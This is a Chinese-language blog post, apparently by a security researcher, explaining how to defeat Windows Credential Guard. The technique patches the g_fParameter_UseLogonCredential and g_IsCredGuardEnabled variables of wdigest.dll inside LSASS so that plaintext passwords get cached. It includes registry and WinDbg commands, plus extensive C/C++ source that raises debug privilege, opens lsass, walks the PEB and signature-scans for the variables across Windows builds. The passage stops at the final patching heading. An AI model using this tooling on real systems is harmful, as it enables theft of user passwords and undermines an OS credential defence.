---
title: Revisiting a Credential Guard Bypass From Wdigest
date: 2023-01-18 01:08:00 +0800
author: WHOAMI
toc: true
categories: ["Windows Security"]
tags: ["Credential Access", "Credential Guard"]
layout: post
---


在过去一段时间中，我一直试图探索 Mimikatz 这款经典工具的底层原理，比如明文凭据如何缓存在 LSASS 进程中，为什么可以使用 `sekurlsa::wdigest` 来提取这些凭据，但这并不是本篇文章要讨论的主题。在细扣 `sekurlsa::wdigest` 模块的同时，我拓展了一个绕过 Credential Guard 的小技巧。或许您已经听说过这种巧妙的 Credential Guard 绕过方法，它包括简单地修补 LSASS 进程中的两个全局变量。



## Background

Adam Chester（[@\_xpn\_](https://twitter.com/_xpn_)）曾写了一篇名为 [*Exploring Mimikatz - Part 1 - WDigest*](https://blog.xpnsec.com/exploring-mimikatz-part-1/) 的优秀文章，其中关于内存修补以启用 UseLogonCredential 并使  Wdigest 缓存明文凭据的方法引起了我的兴趣。

由 LSASS 进程加载的 wdigest.dll 模块有两个有趣的全局变量：`g_fParameter_useLogonCredential` 和 `g_IsCredGuardEnabled`，他们的作用仅从名称就能不言而喻，前者用于确定是否应将明文密码存储在内存中，后者保存模块内 Credential Guard 的状态，通过修补内存中这两个全局变量的值，可以在具有 Credential Guard 保护的系统上开启 Wdigest 明文缓存。

## Credential Guard

Windows Defender Credential Guard 使用基于虚拟化的安全性来隔离机密，依次保护 NTLM 密码哈希、Kerberos TGT 票据和应用程序存储为域凭据的凭据来防止凭据盗窃、哈希传递或票据传递等攻击。

在 Windows 10 之前，LSA 将操作系统所使用的密码存储在其进程内存中。启用 Windows Defender Credential Guard 后，操作系统中的 LSA 进程与存储和保护这些密钥的新组件（称为隔离的 LSA 进程，Isolated LSA Process）进行通信。 独立 LSA 进程存储的数据使用基于虚拟化的安全性进行保护，操作系统的其余部分无法访问。 LSA 使用远程过程调用来与隔离的 LSA 进程进行通信。

下面简要概述了如何使用基于虚拟化的安全性来隔离 LSA：

![](/assets/posts/2023-01-18-revisiting-a-credential-guard-bypass-from-wdigest/credguard.png)
> Source：[How Credential Guard works](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard-how-it-works)

如果我们在启用了 Credential Guard 的系统上尝试使用 Mimikatz 从 LSASS 进程内存中提取凭证，我们会观察到以下结果。

![](/assets/posts/2023-01-18-revisiting-a-credential-guard-bypass-from-wdigest/image-20230117224919974.png)

如上图所示，我们无法从 LSASS 内存中提取任何凭据，NTLM 哈希处显示的是 “LSA Isolated Data: NtlmHash”。并且，即便已经通过修改注册表启用了 Wdigest，也依然获取不到任何明凭据。

为了进行比较，下图所示为不受 Credential Guard 保护的系统上的输出。

![](/assets/posts/2023-01-18-revisiting-a-credential-guard-bypass-from-wdigest/image-20230117225440767.png)

从 Windows 11 Enterprise, Version 22H2 和 Windows 11 Education, Version 22H 开始，兼容系统默认已启用 Windows Defender Credential Guard。不过，通过本篇文章的方法，可以轻松绕过 Credential Guard，并获取明文凭据。

## Technical Details

为了防止用户的明文密码在内存中泄露，微软在 2014 年 5 月发布了 KB2871997 补丁，关闭了 Wdigest 功能，无法从内存中获取明文密码。并且，在 Windows Server 2012 及以上版本中都默认关闭 Wdigest 功能，无法从内存中获取明文密码。但是可以通过修改注册表重新开启 Wdigest，如下所示。

```console
# Enable Wdigest
C:\Users\Administrator\Desktop> reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
# Disable Wdigest
C:\Users\Administrator\Desktop> reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
```

### g_fParameter_useLogonCredential

在 wdigest.dll 内部，其通过 `g_fParameter_UseLogonCredential` 变量来确定系统是否设置了 UseLogonCredential 注册表键值。如下图所示，

`RegQueryValueExW()` 函数检索 UseLogonCredential 注册表值，并由 `g_fParameter_UseLogonCredential` 接收，显然这个变量受前面提到的注册表键值的控制，并决定 Wdigest 后续是否缓存明文凭据。

![](/assets/posts/2023-01-18-revisiting-a-credential-guard-bypass-from-wdigest/image-20230117231930807.png)

因此，如果我们将 LSASS 内存中的 `g_fParameter_UseLogonCredential` 变量值改为 1，也许可以在不更新注册表的情况下获取明文凭据。我们通过 WinDbg 进行内存修补。需要注意的是，由于无法将直接将 WinDbg 附加到 lsass.exe，我们需要先 Attach 内核，并切换到 lsass.exe 进程，相关细节请读者自行上网查阅，这里不再赘述。

（1）首先我们确定当前系统禁用了 Wdigest，并且 Credential Guard 没有启用，如下图所示，可以转储 Administrator 用户的哈希，但是无法提取明文密码。

![](/assets/posts/2023-01-18-revisiting-a-credential-guard-bypass-from-wdigest/image-20230117233804922.png)

（2）通过 WinDbg 调试器修补内存，将 `g_fParameter_UseLogonCredential` 变量值改为 1，如下图所示。

```powershell
ed wdigest!g_fParameter_UseLogonCredential 1
```

![](/assets/posts/2023-01-18-revisiting-a-credential-guard-bypass-from-wdigest/image-20230117234559641.png)

（3）当 Administrator 用户重新输入用户名密码进行身份验证时，即可提取到其明文密码。

![](/assets/posts/2023-01-18-revisiting-a-credential-guard-bypass-from-wdigest/image-20230117234855436.png)

但这是适用于 Credential Guard 禁用的情况下，如果目标系统开启了 Credential Guard 保护，即便将 `g_fParameter_UseLogonCredential` 值设为 1 也无法让 Wdigest 缓存明文凭据。

### g_IsCredGuardEnabled

Adam Chester 的文章中提到的第二个全局变量是 `g_IsCredGuardEnabled`，该变量用于保存模块内 Credential Guard 的状态，并决定 Wdigest 后续是否使用 Credential Guard 兼容的功能。

![](/assets/posts/2023-01-18-revisiting-a-credential-guard-bypass-from-wdigest/image-20230118115006090.png)
当在系统上启用 Credential Guard 时，`g_IsCredGuardEnabled` 的值设置为 ，取消设置此值或将其设为 0 也许可以绕过 Credential Guard 保护。

接下来，笔者通过 C/C++ 创建了 [BypassCredGuard](https://github.com/wh0Nsq/BypassCredGuard) 项目，尝试在 LSASS 内存中修补两个变量的值。这最终可以欺骗 WDigest 模块，使其表现得好像未启用 Credential Guard 保护并且系统配置为在内存中缓存明文密码。一旦这两个值在 LSASS 进程中被正确修补，将在下一次用户输入用户名密码进行身份验证时保存用户的明文密码。

## Implemented by C/C++

笔者的思路是先从 LSASS 进程中计算出加载的 wdigest.dll 模块的基地址，然后在该模块中定位两个全局变量，最后修补这两个变量的值。至于如何找这两个变量，可以参考 Mimikatz 中用过的签名扫描的方法。这些全局变量之所以存在，首先是因为它们在代码中的某个地方被使用。如果我们可以利用某些不变的字节序列作为特征码来识别引用这些全局变量的指令，在 x86_64 架构上，这些指令使用 `rip` 相对寻址来访问和使用全局变量，通过加减相应的偏移量，就能找到相应的全局变量。

以 Windows 10 x64, Version 1903 系统为例，在 wdigest.dll 中搜索 `g_fParameter_useLogonCredential` 变量可以在右侧的看到所有引用过它的地方，如下图所示。

![](/assets/posts/2023-01-18-revisiting-a-credential-guard-bypass-from-wdigest/image-20230118130333809.png)

第一个出现的函数为 `SpAcceptCredentials()`，可以查看此处的汇编代码：

![](/assets/posts/2023-01-18-revisiting-a-credential-guard-bypass-from-wdigest/image-20230118220219077.png)

```php
39 1D B3 38 03 00             cmp     cs:g_fParameter_UseLogonCredential, ebx
8B 05 11 33 03 00             mov     eax, cs:g_IsCredGuardEnabled0F 85 06 72 00 00             jnz     loc_180008A83


                              loc_18000187D:                          ; CODE XREF: SpAcceptCredentials+730B
41 B4 01                      mov     r12b, 1
44 88 A4 24 A8 00 00 00       mov     [rsp+98h+arg_8], r12b
85 C0                         test    eax, eax
0F 85 00 72 00 00             jnz     loc_180008A90
```

在第 1 行的 `cmp` 指令中，第 1 个字节 `39` 代表 `cmp` 的操作码，第 2 个字节 `1D` 代表源寄存器，最后 `B3 38 03 00` 保存的是 `g_fParameter_UseLogonCredential` 变量相对于 `rip` 的偏移量（小端序），此时 `rip` 指向 `B3 38 03 00` 结束的地址。同理，对于第 2 行的指令可以得到 `g_IsCredGuardEnabled` 的偏移量为 `11 33 03 00`。

在这个例子中，我们可以将第 6 行开始的字节序列 `41 B4 01 44 88 A4 24 A8 00 00 00 85 C0 ` 作为特征码，得到地址为 `0x18000187D`。然后减去 16 个字节定位到保存 `g_fParameter_UseLogonCredential` 偏移量的四个字节序列，取出偏移量为 `0x338B3`，最后可以计算出 `g_fParameter_UseLogonCredential` 的地址为 `0x18000187D - Hex(16) + Hex(4) + 0x338B3 = 0x180035124`，如下图所示位置。

![](/assets/posts/2023-01-18-revisiting-a-credential-guard-bypass-from-wdigest/image-20230118134828228.png)

同理可以获得 `g_IsCredGuardEnabled` 变量的地址为 `0x18000187D - Hex(10) + Hex(4) + 0x33311 = 0x180034B88`，如下图所示位置。

![](/assets/posts/2023-01-18-revisiting-a-credential-guard-bypass-from-wdigest/image-20230118135056302.png)

### Main Function

如下编写主函数。主函数启动后，首先会通过 `RtlGetNtVersionNumbers()` 函数获取操作系统版本，并分别赋值常量 `NT_MAJOR_VERSION`、`NT_MINOR_VERSION` 和 `NT_BUILD_NUMBER`。

```c++
int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken = NULL;

	RtlGetNtVersionNumbers(&NT_MAJOR_VERSION, &NT_MINOR_VERSION, &NT_BUILD_NUMBER);
	// Open a process token and get a process token handle with TOKEN_ADJUST_PRIVILEGES permission
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		wprintf(L"[-] OpenProcessToken Error [%u].\n", GetLastError());
		return -1;
	}

	if (EnableDebugPrivilege(hToken, SE_DEBUG_NAME))
	{
		PatchMemory();
	}
}
```

然后通过 `GetCurrentProcess()` 函数获取当前进程，并用 `OpenProcessToken()` 函数打开当前进程的句柄，并将其赋给 `hToken`。

由于 lsass.exe 是系统进程，因此工具在调试 lsass.exe 内存之前需要通过 `AdjustTokenPrivileges()` 函数为其开启 SeDebugPrivilege 特权，为此我编写了 `EnableDebugPrivilege()` 函数为当前进程提升令牌特权，如下所示。

```c++
BOOL EnableDebugPrivilege(HANDLE hToken, LPCWSTR lpName)
{
	BOOL status = FALSE;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges;
	
	// Get the LUID value of the SE_DEBUG_NAME (SeDebugPrivilege) privilege for the local system
	if (!LookupPrivilegeValueW(NULL, lpName, &luidValue))
	{
		wprintf(L"[-] LookupPrivilegeValue Error [%u].\n", GetLastError());
		return status;
	}

	// Set escalation information
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Elevate Process Token Access
	if (!AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, sizeof(tokenPrivileges), NULL, NULL))
	{
		wprintf(L"[-] AdjustTokenPrivileges Error [%u].\n", GetLastError());
		return status;
	}
	else
	{
		status = TRUE;
	}
	return status;
}
```

提升令牌特权后，进入 `PatchMemory()` 函数开始修补内存。

### Get Base Address Of Wdigest.dll Module

在开始修补此之前，我们需要枚举 LSASS 加载的模块，并确定 wdigest.dll 模块基地址以及两个全局变量的地址。为此我编写了 `AcquireLSA()` 函数，如下所示。

```c++
BOOL AcquireLSA()
{
	BOOL status = FALSE;
	DWORD pid;

	if (pid = GetProcessIdByName(L"lsass.exe"))
		cLsass.hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	else
		wprintf(L"[-] Lsass Process Not Found.");

	cLsass.osContext.MajorVersion = NT_MAJOR_VERSION;
	cLsass.osContext.MinorVersion = NT_MINOR_VERSION;
	cLsass.osContext.BuildNumber = NT_BUILD_NUMBER & 0x00007fff;

	if (GetVeryBasicModuleInformations(cLsass.hProcess) && LsassPackage.Module.isPresent)
	{
		wprintf(L"[*] Base address of wdigest.dll: 0x%016llx\n", LsassPackage.Module.Informations.DllBase.address);
		if (LsaSearchGeneric(&cLsass, &LsassPackage.Module, g_References, ARRAYSIZE(g_References), (PVOID*)&g_fParameter_UseLogonCredential, (PVOID*)&g_IsCredGuardEnabled)
			&& LsassPackage.Module.isInit)
		{
			wprintf(L"[*] Address of g_fParameter_UseLogonCredential: 0x%016llx\n", g_fParameter_UseLogonCredential);
			wprintf(L"[*] Address of g_IsCredGuardEnabled: 0x%016llx\n", g_IsCredGuardEnabled);
			status = TRUE;
		}
	}
	return status;
}
```

在该函数内部，首先通过自定义函数 `GetProcessIdByName()` 获取 lsass.exe 进程的 PID，通过 `OpenProcess()` 打开 lsass.exe 进程的句柄后保存到 `cLsass.hProcess` 中。得到 lsass.exe 进程 PID 后，继续调用自定义函数 `GetVeryBasicModuleInformations()` 获取 lsass.exe 进程的基本信息，主要获取 lsass.exe 进程加载的 wdigest.dll 模块，这里采用了遍历 PEB 结构的方法。下面先简单拓展一下关于 PEB 结构的知识。

#### Process Envirorment Block Structure（PEB）

Process Envirorment Block Structure（PEB）即进程环境信息块，Windows 系统的每个运行的进程都维护着一个 PEB 数据块，如下所示。其中包含适用于整个进程的数据结构，存储着全局上下文、启动参数、加载的模块等信息。

```c++
typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;
```

在 PEB 结构中有一个指向 `PEB_LDR_DATA` 结构体的指针 `Ldr`，该结构包含有关进程加载的模块的信息，其定义如下。

```c++
typedef struct _PEB_LDR_DATA
{
     ULONG Length;
     UCHAR Initialized;
     PVOID SsHandle;
     LIST_ENTRY InLoadOrderModuleList;
     LIST_ENTRY InMemoryOrderModuleList;
     LIST_ENTRY InInitializationOrderModuleList;
     PVOID EntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
```

在 PEB_LDR_DATA 结构体中提供了三个双向链表 `InMemoryOrderModuleList`、`InMemoryOrderModuleList` 和 `InInitializationOrderModuleList`，链表内的节点都是一样的，只是排序不同，表中的每个项都是指向包含进程已加载模块信息的 `LDR_DATA_TABLE_ENTRY` 结构的指针。

`LIST_ENTRY` 结构体定义如下：

```c++
typedef struct _LIST_ENTRY
{
     PLIST_ENTRY Flink;
     PLIST_ENTRY Blink;
} LIST_ENTRY, *PLIST_ENTRY;
```

可以看到这个结构有两个成员，均指向 `LDR_DATA_TABLE_ENTRY` 结构体。其中 `Flink` 指向下一个节点，`Blink` 指向上一个节点，所以这是一个双向链表。

当我们从 `PEB_LDR_DATA` 结构中取到任何一个 `LIST_ENTRY` 结构时，这个结构中的 `Flink` 链接到 `LDR_DATA_TABLE_ENTRY` 结构体，该结构定义如下。

```c++
typedef struct _LDR_DATA_TABLE_ENTRY
{
     LIST_ENTRY InLoadOrderLinks;
     LIST_ENTRY InMemoryOrderLinks;
     LIST_ENTRY InInitializationOrderLinks;
     PVOID DllBase;
     PVOID EntryPoint;
     ULONG SizeOfImage;
     UNICODE_STRING FullDllName;
     UNICODE_STRING BaseDllName;
     ULONG Flags;
     WORD LoadCount;
     WORD TlsIndex;
     union
     {
          LIST_ENTRY HashLinks;
          struct
          {
               PVOID SectionPointer;
               ULONG CheckSum;
          };
     };
     union
     {
          ULONG TimeDateStamp;
          PVOID LoadedImports;
     };
     _ACTIVATION_CONTEXT * EntryPointActivationContext;
     PVOID PatchInformation;
     LIST_ENTRY ForwarderLinks;
     LIST_ENTRY ServiceTagLinks;
     LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
```

可以看到，在结构内部保存了进程已加载模块的信息。并且也有三个 `LIST_ENTRY` 结构的链表 `InLoadOrderLinks`、`InMemoryOrderLinks` 和 `InInitializationOrderLinks`，他们分别对应下一个或上一个 `LDR_DATA_TABLE_ENTRY` 节点中对应的 `LIST_ENTRY` 结构。

以 `InMemoryOrderModuleList` 和 `InMemoryOrderLinks` 为例，也就是说：

- `PEB_LDR_DATA` 结构中 `InMemoryOrderModuleList` 中的 `Flink` 指向第一个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 的首地址。
- `PEB_LDR_DATA` 结构中 `InMemoryOrderModuleList` 中的 `Blink` 指向最后一个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 的首地址。
- 第一个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 中的 `Flink` 指向第二个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 的首地址。
- 第一个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 中的 `Blink` 指向 `PEB_LDR_DATA` 结构中 `InMemoryOrderModuleList` 的首地址。
- 第二个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 中的 `Flink` 指向第三个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 的首地址。以此类推。
- 最后一个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 中的 `Flink` 指向 `PEB_LDR_DATA` 结构中 `InMemoryOrderModuleList` 的首地址。

最终可以构建起一个以 `PEB_LDR_DATA` 为起点的一个闭合环形双向链表，这样就可以通过 PEB 遍历进程加载的所有模块了。

在获取 lsass.exe 进程的 PEB 时，我编写了一个 `GetProcessPeb()` 函数，其内部调用 `NtQueryInformationProcess()` 函数检索指定进程的 PEB 结构信息，如下所示。

```c++
BOOL GetProcessPeb(HANDLE hProcess, PPEB pPeb)
{
	BOOL status = FALSE;
	PROCESS_BASIC_INFORMATION processInformations;
	ULONG returnLength;

	if (NT_SUCCESS(NtQueryInformationProcess(hProcess, ProcessBasicInformation, &processInformations, sizeof(processInformations), &returnLength)) 
		&& (returnLength == sizeof(processInformations)) 
		&& processInformations.PebBaseAddress)
	{
		status = ReadProcessMemory(hProcess, processInformations.PebBaseAddress, pPeb, sizeof(PEB), NULL);
	}

	return status;
}
```

#### Get the base address of wdigest.dll module

了解完 PEB 结构后，开始编写 `GetVeryBasicModuleInformations()` 函数，用于遍历 lsass.exe 进程的 PEB，来获取 lsass.exe 进程加载的 wdigest.dll 模块的地址，该函数定义如下。

```c++
BOOL GetVeryBasicModuleInformations(HANDLE hProcess)
{
	BOOL status = FALSE;
	PEB Peb;
	PEB_LDR_DATA LdrData;
	LDR_DATA_TABLE_ENTRY LdrEntry;
	PROCESS_VERY_BASIC_MODULE_INFORMATION moduleInformation;
	UNICODE_STRING moduleName;
	PBYTE pListEntryStart, pListEntryEnd;

	moduleInformation.ModuleName = &moduleName;
	if (GetProcessPeb(hProcess, &Peb))
	{
		if (ReadProcessMemory(hProcess, Peb.Ldr, &LdrData, sizeof(PEB_LDR_DATA), NULL))
		{
			for (
				pListEntryStart = (PBYTE)LdrData.InLoadOrderModuleList.Flink,
				pListEntryEnd = (PBYTE)Peb.Ldr + FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModuleList);
				pListEntryStart != pListEntryEnd;
				pListEntryStart = (PBYTE)LdrEntry.InLoadOrderLinks.Flink
				)
			{
				if (ReadProcessMemory(hProcess, pListEntryStart, &LdrEntry, sizeof(LDR_DATA_TABLE_ENTRY), NULL))
				{
					moduleInformation.DllBase.address = LdrEntry.DllBase;
					moduleInformation.SizeOfImage = LdrEntry.SizeOfImage;
					moduleName = LdrEntry.BaseDllName;

					if (GetUnicodeString(&moduleName, cLsass.hProcess))
					{
						status = FindModules(&moduleInformation);
					}
					LocalFree(moduleName.Buffer);
				}
			}
		}
	}
	return status;
}
```

在 `GetVeryBasicModuleInformations()` 内部，首先调用 `GetProcessPeb()` 函数检索有关 lsass.exe 进程的 PEB 结构信息，并通过 `ReadProcessMemory()` 函数将 `Peb.Ldr` 指向的 `PEB_LDR_DATA` 结构复制到 `LdrData` 中。

然后遍历所有 `LDR_DATA_TABLE_ENTRY` 结构，分别获取模块地址、映像文件大小和映像文件名称，并把它们保存到 `moduleInformation` 中，这是了一个 `PROCESS_VERY_BASIC_MODULE_INFORMATION` 结构体，其定义如下，用于存储 wdigest.dll 模块的有关信息。

```c++
typedef struct PROCESS_VERY_BASIC_MODULE_INFORMATION {
	KULL_M_MEMORY_ADDRESS DllBase;                  // 存储已加载模块的地址
	ULONG SizeOfImage;                              // 存储已加载模块的映像大小
	ULONG TimeDateStamp;
	PCUNICODE_STRING NameDontUseOutsideCallback;    // 存储已加载模块的映像名称
} PROCESS_VERY_BASIC_MODULE_INFORMATION, *PKULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION;
```

最后通过 `FindModules()` 函数比较当前循环中的模块名称与 wdigest.dll 是否相等，并将模块信息保存到 `LsassPackage.Module.Informations` 中，如下所示。

```c++
BOOL FindModules(PPROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation)
{
	if (_wcsicmp(LsassPackage.ModuleName, pModuleInformation->ModuleName->Buffer) == 0)
	{
		LsassPackage.Module.isPresent = TRUE;
		LsassPackage.Module.Informations = *pModuleInformation;
	}

	return TRUE;
}
```

至此，成功获取到 wdigest.exe 进程中加载的 lsasrv.dll 模块的信息，`GetVeryBasicModuleInformations()` 函数调用结束。接下来，将调用 `LsaSearchGeneric()` 函数来定位 `g_fParameter_useLogonCredential` 和 `g_IsCredGuardEnabled` 这两个全局变量。

### Get Two g_* Global Variables

前文中提到，在定位 `g_fParameter_useLogonCredential` 和 `g_IsCredGuardEnabled` 这两个关键的全局变量时，采用签名扫描的方法。参考 Mimikatz，可以将常见系统版本的特征码保存在一个名为 `g_References[]` 的数组中，这些特征码用于识别引用它们的指令，如下所示。

```c++
BYTE PTRN_WIN1607_SpAcceptCredentials[] = { 0x41, 0xb5, 0x01, 0x44, 0x88, 0x6d, 0x48, 0x85, 0xc0 };
BYTE PTRN_WIN1909_SpAcceptCredentials[] = { 0x41, 0xb4, 0x01, 0x44, 0x88, 0xa4, 0x24, 0xa8, 0x00, 0x00, 0x00, 0x85, 0xc0 };
BYTE PTRN_WIN2022_SpAcceptCredentials[] = { 0x41, 0xb5, 0x01, 0x85, 0xc0 };
PATCH_GENERIC g_References[] = {
	{WIN_BUILD_10_1607,	{sizeof(PTRN_WIN1607_SpAcceptCredentials),	PTRN_WIN1607_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_10_1703,	{sizeof(PTRN_WIN1909_SpAcceptCredentials),	PTRN_WIN1909_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_10_1709,	{sizeof(PTRN_WIN1909_SpAcceptCredentials),	PTRN_WIN1909_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_10_1803,	{sizeof(PTRN_WIN1909_SpAcceptCredentials),	PTRN_WIN1909_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_10_1809,	{sizeof(PTRN_WIN1909_SpAcceptCredentials),	PTRN_WIN1909_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_10_1903,	{sizeof(PTRN_WIN1909_SpAcceptCredentials),	PTRN_WIN1909_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_10_1909,	{sizeof(PTRN_WIN1909_SpAcceptCredentials),	PTRN_WIN1909_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_10_2004,	{sizeof(PTRN_WIN2022_SpAcceptCredentials),	PTRN_WIN2022_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_10_20H2,	{sizeof(PTRN_WIN2022_SpAcceptCredentials),	PTRN_WIN2022_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_10_21H2,	{sizeof(PTRN_WIN2022_SpAcceptCredentials),	PTRN_WIN2022_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_MIN_BUILD_11,	{sizeof(PTRN_WIN2022_SpAcceptCredentials),	PTRN_WIN2022_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
	{WIN_BUILD_2022,	{sizeof(PTRN_WIN2022_SpAcceptCredentials),	PTRN_WIN2022_SpAcceptCredentials},	{0, NULL}, {-16, -10}},
};
```

数组中的每个成员都是一个 `PATCH_GENERIC` 结构体，用于保存特征码的匹配规则，其结构定义如下。

```c++
typedef struct _PATCH_GENERIC {
	DWORD MinBuildNumber;     // 系统版本号
	PATCH_PATTERN Search;     // 包含特征码
	PATCH_PATTERN Patch;
	PATCH_OFFSETS Offsets;    // 保存 g_fParameter_useLogonCredential 和 g_IsCredGuardEnabled 偏移量值的四个字节的偏移量
} PATCH_GENERIC, * PPATCH_GENERIC;
```

下面开始编写 `LsaSearchGeneric()` 函数，定义如下。

```c++
BOOL LsaSearchGeneric(PLSA_CONTEXT cLsass, PLSA_LIB pLib, PPATCH_GENERIC genericReferences, SIZE_T cbReferences, PVOID* genericPtr, PVOID* genericPtr1)
{
	BOOL status = FALSE;
	MEMORY_SEARCH sMemory = { {pLib->Informations.DllBase.address, pLib->Informations.SizeOfImage}, NULL };
	PPATCH_GENERIC currentReference;
	LONG offset;
	MEMORY_ADDRESS lsassMemory;

	if (currentReference = GetGenericFromBuild(genericReferences, cbReferences, cLsass->osContext.BuildNumber))
	{
		if (MemorySearch(cLsass->hProcess, currentReference->Search.Pattern, currentReference->Search.Length, &sMemory))
		{
			wprintf(L"[*] Matched signature at 0x%016llx: ", sMemory.result);
			PrintfHex(currentReference->Search.Pattern, currentReference->Search.Length);

			lsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off0;
			if (status = ReadProcessMemory(cLsass->hProcess, lsassMemory.address, &offset, sizeof(LONG), NULL))
			{
				*genericPtr = ((PBYTE)lsassMemory.address + sizeof(LONG) + offset);
			}

			if (genericPtr1)
			{
				lsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off1;
				if (status = ReadProcessMemory(cLsass->hProcess, lsassMemory.address, &offset, sizeof(LONG), NULL))
				{
					*genericPtr1 = ((PBYTE)lsassMemory.address + sizeof(LONG) + offset);
				}
			}
		}
	}
	pLib->isInit = status;
	return status;
}
```

在该函数内部，`GetGenericFromBuild()` 会根据 `cLsass->osContext.BuildNumber` 记录的版本号在 `g_References` 中选择适用于当前系统版本的特征码规则，并赋值给  `currentReference`。然后将 `currentReference` 连同 `&sMemory` 传入自定义函数 `MemorySearch()`。其中 `sMemory` 是一个 `MEMORY_SEARCH` 结构体，用于临时保存 lsasrv.dll 模块的基地址和映像大小，其定义如下。

```c++
typedef struct _MEMORY_SEARCH {
	MEMORY_RANGE memoryRange;
	LPVOID result;
} MEMORY_SEARCH, * PMEMORY_SEARCH;

typedef struct _MEMORY_RANGE {
	MEMORY_ADDRESS memoryAdress;
	SIZE_T size;
} MEMORY_RANGE, * PMEMORY_RANGE;

typedef struct _MEMORY_ADDRESS {
	LPVOID address;
} MEMORY_ADDRESS, * PMEMORY_ADDRESS;
```

 `MemorySearch()` 函数用于在内存中匹配特征码，其定义如下。其首先划分出 wdigest.dll 模块的内存空间从而确定要搜索范围的最大内存地址 `limit`，然后遍历 `limit` 范围的内存，通过 `RtlEqualMemory()` 函数匹配出与特征码相同的内存块，最终确定特征码的地址。

```c++
BOOL MemorySearch(HANDLE hProcess, LPBYTE Pattern, SIZE_T Length, PMEMORY_SEARCH Search)
{
	BOOL status = FALSE;
	MEMORY_SEARCH sBuffer = { { NULL, Search->memoryRange.size}, NULL };
	PBYTE CurrentPtr;
	PBYTE limit;

	if (sBuffer.memoryRange.memoryAdress.address = LocalAlloc(LPTR, Search->memoryRange.size))
	{
		if (ReadProcessMemory(hProcess, Search->memoryRange.memoryAdress.address, sBuffer.memoryRange.memoryAdress.address, Search->memoryRange.size, NULL))
		{
			limit = (PBYTE)sBuffer.memoryRange.memoryAdress.address + sBuffer.memoryRange.size;
			for (CurrentPtr = (PBYTE)sBuffer.memoryRange.memoryAdress.address; !status && (CurrentPtr + Length <= limit); CurrentPtr++)
				status = RtlEqualMemory(Pattern, CurrentPtr, Length);
			CurrentPtr--;
			Search->result = (PBYTE)Search->memoryRange.memoryAdress.address + ((PBYTE)CurrentPtr - (PBYTE)sBuffer.memoryRange.memoryAdress.address);
		}
	}
	return status;
}
```

得到的特征码地址被赋值给 `Search->result`，然后返回 `LsaSearchGeneric()` 函数后，将 `currentReference` 中获取的第一个偏移量加到特征码地址上，如下所示。

```c++
lsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off0;
```

这里得到 `cmp cs:g_fParameter_UseLogonCredential, ebx` 指令中保存 `g_fParameter_useLogonCredential` 变量偏移量的四个字节序列的地址。然后通过 `ReadProcessMemory()` 函数获取这四个字节序列的值到 `offset` 中，此时 `offset` 中保存了 `g_fParameter_useLogonCredential` 变量真正的偏移量。将 `sizeof(LONG)` 和 `offset` 加到 `rip` 指向的地址上即可得到 `g_fParameter_useLogonCredential` 变量的地址，如下所示。

```c++
if (status = ReadProcessMemory(cLsass->hProcess, lsassMemory.address, &offset, sizeof(LONG), NULL))
{
	*genericPtr = ((PBYTE)lsassMemory.address + sizeof(LONG) + offset);
}
```

同理可以获得 `g_IsCredGuardEnabled` 变量的地址。

至此，成功得到 `g_fParameter_useLogonCredential` 和 `g_IsCredGuardEnabled` 变量的地址。

### Patch Two Global Variables In Memory

